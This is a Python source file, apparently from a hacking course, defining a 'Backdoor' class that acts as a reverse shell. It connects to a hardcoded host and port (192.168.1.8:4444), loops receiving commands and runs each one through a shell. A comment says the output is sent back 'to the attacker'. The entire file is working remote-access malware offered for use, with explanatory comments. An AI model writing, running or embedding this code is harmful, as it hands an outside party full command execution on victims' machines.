#!/usr/bin/env python

import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        # create a socket object (an instance of the connection)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to our target with this socket object
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        # convert data as json
        json_data = json.dumps(data)
        # send data as json
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                # receive data as json
                json_data = json_data + self.connection.recv(1024)
                # convert-unrap data back from json
                return json.loads(json_data)
            except ValueError:
                continue

    # this function is to return the result of system command
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        # execute these commands in a loop to be able to send commands continuously
        while True:
            # receive data in a variable named command
            command = self.reliable_receive()

            # pass this command variable to a function named execute_system_command
            command_result = self.execute_system_command(command)

            # send the result to the attacker
            self.reliable_send(command_result)

        connection.close()


# create an instance of the object and run the class
my_backdoor = Backdoor("192.168.1.8", 4444)
my_backdoor.run()